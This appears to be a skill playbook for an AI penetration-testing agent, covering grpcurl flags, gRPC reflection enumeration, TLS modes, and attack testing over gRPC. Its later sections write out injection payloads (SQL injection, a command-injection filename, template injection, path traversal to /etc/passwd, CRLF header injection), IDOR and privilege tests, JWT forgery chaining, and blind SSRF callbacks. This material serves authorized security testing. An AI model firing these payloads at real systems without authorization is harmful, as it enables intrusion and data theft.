---
name: grpcurl
description: grpcurl gRPC testing — reflection vs. proto source, request body shapes, TLS/plaintext modes, and method invocation syntax.
---

# grpcurl CLI Playbook

Official docs:
- https://github.com/fullstorydev/grpcurl

Canonical syntax:
- Discovery: `grpcurl [flags] <host:port> list [<service>]` or `... describe [<symbol>]`
- Invocation: `grpcurl [flags] -d '<json_body>' <host:port> <service.method>`

Install (not preinstalled in the sandbox):
`go install -v github.com/fullstorydev/grpcurl/cmd/grpcurl@latest`
(installed to `$HOME/go/bin/grpcurl`; sandbox PATH already includes it.)

High-signal flags:
- `-plaintext` use plain-text HTTP/2 (no TLS; required for most dev servers)
- `-insecure` skip TLS server-cert / hostname verification (TLS without validation)
- `-cacert <file>` trusted root CA(s) for server verification
- `-cert <file>` / `-key <file>` client cert + key for mTLS
- `-authority <host>` HTTP/2 `:authority` pseudo-header (also used as SNI when TLS)
- `-servername <host>` TLS SNI only (prefer `-authority`; `-servername` may be removed in future)
- `-alts` use Application Layer Transport Security (ALTS) when connecting
- `-alts-handshaker-service <addr>` custom ALTS handshaker server
- `-alts-target-service-account <email>` expected server service account for ALTS (repeatable; RPC refused if mismatch)
- `-H 'name: value'` extra header (repeatable; also sent during reflection)
- `-rpc-header 'name: value'` header on the RPC call only (not reflection)
- `-reflect-header 'name: value'` header on reflection calls only
- `-expand-headers` allow `${VAR}` env-var expansion inside `-H`/`-rpc-header`/`-reflect-header`
- `-d '<data>'` request body (`@` reads stdin, `@file.json` not supported — use `-d @ < file.json`)
- `-format <json|text>` request body format (default `json`); for `text`, protobuf text format with `0x1E` record separators between streamed messages
- `-emit-defaults` emit default values in JSON responses (otherwise omitted)
- `-allow-unknown-fields` tolerate unknown fields in JSON request body
- `-max-msg-sz <bytes>` max response message size (default 4 MB)
- `-max-time <sec>` deadline for the whole operation
- `-connect-timeout <sec>` connection-establishment timeout (default 10s)
- `-keepalive-time <sec>` max idle before keepalive probe
- `-proto <file>` proto source file (bypass reflection; repeatable)
- `-protoset <file>` encoded `FileDescriptorSet` (bypass reflection; repeatable)
- `-import-path <dir>` dir for resolving `import` statements in `-proto` files (repeatable)
- `-use-reflection` force use of server reflection in addition to `-proto`/`-protoset` (default true unless proto source given)
- `-proto-out-dir <dir>` write generated `.proto` files for inspected elements
- `-protoset-out <file>` write encoded `FileDescriptorSet` for inspected elements
- `-format-error` format non-OK status responses using `-format` setting
- `-msg-template` when describing a message, print an empty template of its JSON
- `-unix` server address is a Unix domain socket path
- `-user-agent <ua>` extra UA suffix
- `-v` verbose; `-vv` very verbose (includes timing)

Agent-safe baseline for automation:
`grpcurl -plaintext -max-time 10 -connect-timeout 5 -d '{"field":"value"}' target.tld:50051 service.v1.Service/Method`
(swap `-plaintext` for `-cacert <ca>` / `-insecure` on TLS; add `-H "authorization: Bearer <token>"` for auth.)

Common patterns:
- List all services (requires reflection):
  `grpcurl -plaintext target.tld:50051 list`
- Describe a service's methods:
  `grpcurl -plaintext target.tld:50051 describe service.v1.Service`
- Describe a message (field names/types) + print JSON template:
  `grpcurl -plaintext -msg-template target.tld:50051 describe service.v1.MyMessage`
- Invoke a unary method with inline JSON:
  `grpcurl -plaintext -d '{"id":1}' target.tld:50051 service.v1.Service/GetItem`
- Invoke with body from stdin (useful for multi-line/complex JSON):
  `grpcurl -plaintext -d @ target.tld:50051 service.v1.Service/GetItem < body.json`
- Streaming method (concatenate request messages in body):
  `grpcurl -plaintext -d '{"id":1}{"id":2}' target.tld:50051 service.v1.Service/BatchGet`
- Local `.proto` files (no reflection available):
  `grpcurl -plaintext -proto service.proto -import-path ./protos -d '{"id":1}' target.tld:50051 service.v1.Service/GetItem`
- TLS with pinned CA:
  `grpcurl -cacert ca.pem -d '{"id":1}' target.tld:443 service.v1.Service/GetItem`
- Auth header injection:
  `grpcurl -plaintext -H 'authorization: Bearer <token>' -d '{"id":1}' target.tld:50051 service.v1.Service/GetItem`
- Timing + verbose metadata (debugging):
  `grpcurl -vv -plaintext -d '{"id":1}' target.tld:50051 service.v1.Service/GetItem`

Critical correctness rules:
- `list`/`describe` requires server reflection (`grpc.reflection.v1alpha.ServerReflection`) unless `-proto`/`-protoset` is supplied — many production servers disable reflection.
- Method addressing: either `service.Method` or `service/Method`; the fully-qualified service name is required.
- `-d @` reads stdin; there is **no** `-d @file.json` syntax — use shell redirection (`-d @ < file.json`).
- JSON booleans and numbers must match proto field types exactly; `-allow-unknown-fields` tolerates extra fields, not type mismatches.
- TLS: `-plaintext` and `-insecure` are different modes. `-plaintext` = no TLS at all; `-insecure` = TLS without cert validation. Mutually exclusive.
- `-authority` overrides the HTTP/2 `:authority` pseudo-header and, under TLS, the SNI. Set it when probing by IP with a hostname-bound cert.
- `-max-msg-sz` defaults to 4 MB — RPCs returning larger payloads fail silently; raise it.
- Injection surface: body fields, headers (`-H`, `-rpc-header`), and the method name itself are all input positions. Fuzz each independently; test `-d` body for the injection vuln classes.

Usage rules:
- Reach for grpcurl any time the target speaks gRPC — HTTP/2 scanners (nuclei, feroxbuster) don't understand gRPC framing.
- Keep `-plaintext` for internal/dev servers; always probe with `list` first before invoking.
- When reflection is off, request `.proto` files out-of-band, then use `-proto` + `-import-path`.
- The sandbox env's `http_proxy` doesn't apply to gRPC — grpcurl talks HTTP/2 directly. To send gRPC through Caido, Caido must be configured as a gRPC proxy on a specific port; otherwise invocations bypass it.
- Do not use `-h`/`--help` for routine runs unless absolutely necessary.

Failure recovery:
- `Failed to list services: ... Unimplemented`: reflection is off — fetch the `.proto` and pass `-proto`.
- TLS handshake fails against a cert-bound IP: set `-authority <hostname>` (SNI + `:authority`).
- "message size larger than max": raise `-max-msg-sz`.
- Field type errors on JSON body: run `grpcurl ... describe <message>` + `-msg-template` to get the exact JSON shape.
- Timeouts on long streaming calls: raise `-max-time` and `-keepalive-time`.

If uncertain, query web_search with:
`site:github.com/fullstorydev/grpcurl grpcurl <flag>`

## Reflection-First Discovery Methodology

gRPC services that expose the reflection API (`grpc.reflection.v1alpha.ServerReflection` or `grpc.reflection.v1.ServerReflection`) yield their full schema at runtime. The discovery pipeline follows a strict phase order — each phase's output feeds the next.

Phase 1 — enumerate services:
```bash
grpcurl -plaintext -max-time 10 target.tld:50051 list
```
Output: one fully-qualified service name per line. `grpc.reflection.v1alpha.ServerReflection` appearing confirms reflection is live.

Phase 2 — enumerate methods per service:
```bash
grpcurl -plaintext target.tld:50051 list payment.v1.PaymentService
```
Output: fully-qualified method names (`payment.v1.PaymentService.Charge`, etc.). Script this across every service from phase 1:
```bash
grpcurl -plaintext target.tld:50051 list | while read svc; do
  echo "=== $svc ==="
  grpcurl -plaintext target.tld:50051 list "$svc"
done
```

Phase 3 — describe methods and messages:
```bash
grpcurl -plaintext target.tld:50051 describe payment.v1.PaymentService.Charge
```
Shows the RPC signature: input/output message types, streaming direction. Then introspect each message:
```bash
grpcurl -plaintext -msg-template target.tld:50051 describe payment.v1.ChargeRequest
```
`-msg-template` prints a zero-valued JSON template — copy it, fill in test values, and use as the `-d` body.

Phase 4 — invoke:
```bash
grpcurl -plaintext -d '{"amount":100,"currency":"USD","card_token":"tok_test"}' \
  target.tld:50051 payment.v1.PaymentService/Charge
```

Proto extraction — reverse-engineer the full schema from a reflection-enabled server:
```bash
mkdir -p protos
grpcurl -plaintext -proto-out-dir protos target.tld:50051 describe
```
Writes `.proto` files for all exposed services and their transitive dependencies. Use these against non-reflective instances of the same service, or for offline schema analysis.

Binary descriptor extraction:
```bash
grpcurl -plaintext -protoset-out services.protoset target.tld:50051 describe
```
The `.protoset` is an encoded `FileDescriptorSet` — feed it back with `-protoset` against other servers, or decode with `protoc --decode google.protobuf.FileDescriptorSet`.

Full automated enumeration script:
```bash
HOST="target.tld:50051"
mkdir -p grpc_enum protos
grpcurl -plaintext -max-time 10 "$HOST" list > grpc_enum/services.txt 2>&1
grpcurl -plaintext -proto-out-dir protos "$HOST" describe > /dev/null 2>&1
while read svc; do
  grpcurl -plaintext "$HOST" list "$svc" > "grpc_enum/${svc}_methods.txt" 2>&1
  grpcurl -plaintext "$HOST" describe "$svc" > "grpc_enum/${svc}_describe.txt" 2>&1
done < grpc_enum/services.txt
```

## Proto Source Workflow

When reflection is disabled — the `list` call returns `Unimplemented` — the schema must come from proto source files.

Sources for proto files:
- Application source code repository (look for `*.proto` in `proto/`, `api/`, or `internal/`)
- API documentation or proto registries (Buf Schema Registry, googleapis)
- Extracted via `-proto-out-dir` from a reflection-enabled environment (staging, dev)
- Decompiled from a mobile app or gRPC-Web client bundle

Loading proto files:
```bash
grpcurl -plaintext \
  -proto api/v1/service.proto \
  -import-path ./proto \
  -import-path ./third_party/googleapis \
  target.tld:50051 api.v1.Service/GetItem -d '{"id":1}'
```
Both `-proto` and `-import-path` are repeatable — add each `.proto` and each import root directory.

Pre-compiled descriptor sets (from `protoc --descriptor_set_out`):
```bash
grpcurl -plaintext -protoset compiled.protoset \
  target.tld:50051 api.v1.Service/GetItem -d '{"id":1}'
```

Hybrid mode — merge local definitions with server reflection:
```bash
grpcurl -plaintext -use-reflection -proto local_extensions.proto \
  target.tld:50051 list
```
`-use-reflection` defaults to true unless `-proto`/`-protoset` is given; passing it explicitly re-enables reflection alongside local sources. This is useful when the server exposes some services via reflection but the custom extensions are defined locally.

## Streaming Methods

gRPC defines four method types. grpcurl handles all of them.

Unary (1 request → 1 response):
```bash
grpcurl -plaintext -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get
```

Server-streaming (1 request → N responses):
```bash
grpcurl -plaintext -d '{"query":"*"}' target.tld:50051 svc.v1.Svc/Search
```
grpcurl prints each response message as it arrives. Use `-max-time` to bound long-lived streams.

Client-streaming (N requests → 1 response) — concatenate messages in JSON format:
```bash
grpcurl -plaintext -d '{"item":"a"}{"item":"b"}{"item":"c"}' \
  target.tld:50051 svc.v1.Svc/BatchInsert
```
Or pipe from stdin for large batches:
```bash
cat items.jsonl | grpcurl -plaintext -d @ target.tld:50051 svc.v1.Svc/BatchInsert
```

Bidirectional streaming (N requests → N responses) — interactive from a terminal:
```bash
grpcurl -plaintext -d @ target.tld:50051 svc.v1.Svc/Chat
```
Type JSON messages line by line; responses print as they arrive. EOF (Ctrl-D) closes the send side.

Text format for multi-message streams — use `-format text` with `0x1E` (record separator) between messages:
```bash
printf '{"id":1}\x1e{"id":2}' | grpcurl -plaintext -format text -d @ \
  target.tld:50051 svc.v1.Svc/BatchGet
```
The stream must not end with a record separator — a trailing `0x1E` is interpreted as a final blank message.

JSON format separators: for message types whose JSON representation is not an object (e.g. a wrapper around a scalar), separate messages with whitespace (newline).

## TLS, mTLS, and ALTS

Plaintext — no TLS, plain HTTP/2:
```bash
grpcurl -plaintext target.tld:50051 list
```

TLS with system CAs:
```bash
grpcurl target.tld:443 list
```
No flag needed — TLS with system CA trust is the default when neither `-plaintext` nor `-insecure` is set.

TLS with pinned CA:
```bash
grpcurl -cacert internal-ca.pem target.tld:443 list
```

TLS without validation (self-signed, testing only):
```bash
grpcurl -insecure target.tld:443 list
```

mTLS — client certificate authentication:
```bash
grpcurl -cacert ca.pem -cert client.pem -key client-key.pem \
  target.tld:443 svc.v1.Svc/Get -d '{"id":1}'
```

Authority override — probe by IP when the cert is bound to a hostname:
```bash
grpcurl -authority api.internal.tld -cacert ca.pem \
  10.0.1.42:443 list
```
`-authority` sets both the HTTP/2 `:authority` pseudo-header and the TLS SNI. Use it instead of `-servername` (which sets SNI only and may be removed).

Unix domain socket:
```bash
grpcurl -plaintext -unix /var/run/service.sock list
```
The address argument is the socket path when `-unix` is set.

ALTS (Application Layer Transport Security) — Google infrastructure:
```bash
grpcurl -alts target.tld:50051 list
```
Optionally pin the expected server service account:
```bash
grpcurl -alts -alts-target-service-account svc@project.iam.gserviceaccount.com \
  target.tld:50051 list
```
`-alts-target-service-account` is repeatable — multiple accounts are allowed; the RPC is refused if the server authenticates with an account not in the list. `-alts-handshaker-service <addr>` overrides the ALTS handshaker endpoint.

Mode exclusivity:
- `-plaintext` and `-insecure` are mutually exclusive — one or the other, never both.
- `-alts` is a separate transport — do not combine with `-plaintext`, `-insecure`, or `-cacert`.
- Omitting all three defaults to TLS with system CA validation.

## Header Injection and Auth Testing

Three header scopes:

| Flag | Sent on reflection | Sent on RPC |
|---|---|---|
| `-H` | yes | yes |
| `-rpc-header` | no | yes |
| `-reflect-header` | yes | no |

All are repeatable. `-expand-headers` enables `${VAR}` env-var substitution in values — supply secrets without CLI arguments:
```bash
export AUTH_TOKEN="eyJ..."
grpcurl -plaintext -expand-headers \
  -H 'authorization: Bearer ${AUTH_TOKEN}' \
  -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get
```

Use `-reflect-header` when reflection requires separate credentials from the RPC (e.g. an internal admin token for reflection, user token for the call):
```bash
grpcurl -plaintext \
  -reflect-header 'x-admin-key: admin_secret' \
  -rpc-header 'authorization: Bearer user_token' \
  target.tld:50051 svc.v1.Svc/Get -d '{"id":1}'
```

Auth patterns:
- Bearer JWT: `-H 'authorization: Bearer <jwt>'`
- API key: `-H 'x-api-key: <key>'`
- Basic auth: `-H 'authorization: Basic <base64(user:pass)>'`
- Custom metadata: `-H 'x-tenant-id: tenant_123'`
- mTLS: `-cert client.pem -key client-key.pem` (no header needed)

Differential auth testing — compare responses across privilege levels:
```bash
# Admin context
grpcurl -plaintext -H 'authorization: Bearer <admin_jwt>' \
  -d '{"user_id":"other_user"}' target.tld:50051 svc.v1.UserService/GetProfile > admin_resp.json

# User context — same method, same target user
grpcurl -plaintext -H 'authorization: Bearer <user_jwt>' \
  -d '{"user_id":"other_user"}' target.tld:50051 svc.v1.UserService/GetProfile > user_resp.json

diff admin_resp.json user_resp.json
```
If both succeed with identical data, the method lacks authorization checks → BFLA.

## Injection Over gRPC

gRPC serializes structured protobuf messages, but the server-side handler often passes field values into SQL queries, shell commands, template engines, or file-system operations unchanged. The injection surface is:

**Body fields** (`-d`): every string, bytes, or repeated field in the request message is an injection point. Use `-msg-template` to get the exact JSON shape, then fuzz each field independently:
```bash
# Get the template
grpcurl -plaintext -msg-template target.tld:50051 describe svc.v1.SearchRequest
# Returns: {"query": "", "page_size": 0, "filters": {}}

# SQLi in the query field
grpcurl -plaintext -d '{"query":"'\'' OR 1=1--","page_size":10}' \
  target.tld:50051 svc.v1.Svc/Search

# Command injection
grpcurl -plaintext -d '{"filename":"report.pdf; id"}' \
  target.tld:50051 svc.v1.Svc/GenerateReport

# SSTI
grpcurl -plaintext -d '{"template":"{{7*7}}"}' \
  target.tld:50051 svc.v1.Svc/RenderTemplate

# Path traversal
grpcurl -plaintext -d '{"path":"../../../../etc/passwd"}' \
  target.tld:50051 svc.v1.Svc/ReadFile
```

**Metadata/headers**: `-H` and `-rpc-header` values are processed by interceptors, logging middleware, and auth handlers — fuzz them for header injection, log injection, and auth bypass:
```bash
grpcurl -plaintext -H 'x-request-id: test\r\nX-Admin: true' \
  -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get
```

**Mass assignment via unknown fields**: `-allow-unknown-fields` lets grpcurl send fields not in the proto definition. If the server binds them (e.g. via reflection-based deserialization or a permissive ORM):
```bash
grpcurl -plaintext -allow-unknown-fields \
  -d '{"name":"test","role":"admin","is_superuser":true}' \
  target.tld:50051 svc.v1.UserService/CreateUser
```

**Type confusion**: intentionally mismatch JSON types against proto field types — send a string where an int is expected, a nested object where a scalar is expected. Tests deserialization robustness and error-path behavior:
```bash
# Proto expects int32, send string
grpcurl -plaintext -d '{"id":"not_a_number"}' \
  target.tld:50051 svc.v1.Svc/Get
```

**Oversized payloads**: default `-max-msg-sz` is 4 MB — construct payloads near or above the server's configured limit to test truncation, OOM, and error handling:
```bash
python3 -c "import json; print(json.dumps({'data':'A'*5000000}))" | \
  grpcurl -plaintext -max-msg-sz 10000000 -d @ target.tld:50051 svc.v1.Svc/Process
```

## IDOR and Authorization Testing Over gRPC

gRPC methods that take an ID field (user_id, order_id, account_id) are IDOR candidates. The testing pattern:

1. Describe the message to find ID fields:
```bash
grpcurl -plaintext -msg-template target.tld:50051 describe svc.v1.GetOrderRequest
# {"order_id": "", "include_items": false}
```

2. Invoke with your own ID (baseline):
```bash
grpcurl -plaintext -H 'authorization: Bearer <your_jwt>' \
  -d '{"order_id":"order_001"}' target.tld:50051 svc.v1.OrderService/GetOrder
```

3. Invoke with another user's ID (IDOR test):
```bash
grpcurl -plaintext -H 'authorization: Bearer <your_jwt>' \
  -d '{"order_id":"order_999"}' target.tld:50051 svc.v1.OrderService/GetOrder
```
If both return data, the method lacks object-level authorization.

BFLA — invoke methods outside your role:
```bash
# User-scoped token calling an admin method
grpcurl -plaintext -H 'authorization: Bearer <user_jwt>' \
  -d '{"user_id":"target"}' target.tld:50051 svc.v1.AdminService/DeleteUser
```
Expected: `PERMISSION_DENIED` (code 7). If it returns `OK` (code 0) → BFLA.

Enumerate methods to identify admin/internal services — services named `Admin*`, `Internal*`, `Debug*`, or `Health*` are high-value targets:
```bash
grpcurl -plaintext target.tld:50051 list | grep -iE 'admin|internal|debug|health'
```

## Output, Automation, and Scripting

Verbose and timing:
- `-v`: prints request/response headers, trailers, and metadata
- `-vv`: adds timing data (connection time, RPC duration) — use for performance-sensitive tests

Default-value visibility:
```bash
grpcurl -plaintext -emit-defaults -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get
```
Without `-emit-defaults`, zero-valued fields are omitted from JSON output — a field showing `""` or `0` is invisible. Always use `-emit-defaults` when inspecting responses for information disclosure or completeness.

Error formatting:
```bash
grpcurl -plaintext -format-error -d '{"id":-1}' target.tld:50051 svc.v1.Svc/Get
```
Without `-format-error`, non-OK responses print raw status text. With it, the error details are formatted as JSON — parse them for stack traces, internal paths, or debug information.

Exit codes: grpcurl exits 0 on gRPC `OK`, non-zero on any gRPC error. Map exit codes to gRPC status codes in scripts:
```bash
grpcurl -plaintext -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get 2>err.txt
STATUS=$?
if [ $STATUS -ne 0 ]; then
  grep -oP 'Code: \K\w+' err.txt
fi
```

Pipeline — automated method fuzzing across all discovered services:
```bash
HOST="target.tld:50051"
grpcurl -plaintext "$HOST" list | while read svc; do
  grpcurl -plaintext "$HOST" list "$svc" | while read method; do
    echo "--- $method ---"
    grpcurl -plaintext -emit-defaults -max-time 5 -d '{}' "$HOST" "$method" 2>&1
  done
done
```

JSON output processing:
```bash
grpcurl -plaintext -emit-defaults -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get | jq '.sensitive_field'
```

User-Agent control:
```bash
grpcurl -plaintext -user-agent "security-scan/1.0" target.tld:50051 list
```
Appended to the default grpc-go User-Agent string. Set it to identify scan traffic or to test UA-based filtering.

## Tool Chaining

**nmap → grpcurl** — identify gRPC ports, then enumerate:
```bash
nmap -sV -p- --open target.tld -oG - | grep 'http/2\|grpc' | \
  awk '{print $2":"$5}' | while read hp; do
    grpcurl -plaintext -max-time 5 "$hp" list 2>&1
  done
```

**grpcurl → nuclei** — extract endpoints for template scanning:
```bash
grpcurl -plaintext target.tld:50051 list > services.txt
# Feed into gRPC-aware nuclei templates or custom protocol checks
```

**jwt_tool → grpcurl** — forge a JWT, then test auth over gRPC:
```bash
FORGED=$(jwt_tool <token> -X k -pk server_pubkey.pem -b | tail -1)
grpcurl -plaintext -H "authorization: Bearer $FORGED" \
  -d '{"id":1}' target.tld:50051 svc.v1.Svc/Get
```

**grpcurl → sqlmap** — if a gRPC field is confirmed injectable, extract the value and test with sqlmap against the underlying HTTP/2 transport (requires a proxy that can intercept gRPC, or a wrapper endpoint).

**interactsh-client → grpcurl** — blind SSRF/RCE over gRPC:
```bash
OAST=$(head -1 oast_payloads.txt)
grpcurl -plaintext -d "{\"url\":\"https://${OAST}\"}" \
  target.tld:50051 svc.v1.Svc/Fetch
# Monitor interactsh-client for the callback
```

**Caido integration**: gRPC over HTTP/2 does not route through the sandbox's HTTP proxy automatically. grpcurl connects directly. To capture gRPC traffic in Caido, configure Caido as an HTTP/2-aware proxy on a dedicated port and use `-H` to set the appropriate proxy headers, or route through an envoy/grpc-web proxy that Caido can intercept.

Routed consumers:
- API/protocol testing in `reconnaissance/*` (service enumeration via `list`/`describe`)
- `vulnerabilities/sql_injection.md`, `vulnerabilities/argument_injection.md`, `vulnerabilities/rce.md`, `vulnerabilities/insecure_deserialization.md` (injection classes exercised over gRPC bodies)
- `vulnerabilities/authentication_jwt.md`, `vulnerabilities/broken_function_level_authorization.md` (auth tested via `-H "authorization: ..."`)
- `vulnerabilities/mass_assignment.md`, `vulnerabilities/idor.md` (field-level and ID-field tests)
- `vulnerabilities/ssrf.md` (blind SSRF via OAST payloads in gRPC fields)
- `vulnerabilities/information_disclosure.md` (`-emit-defaults`, `-format-error`, verbose error messages)
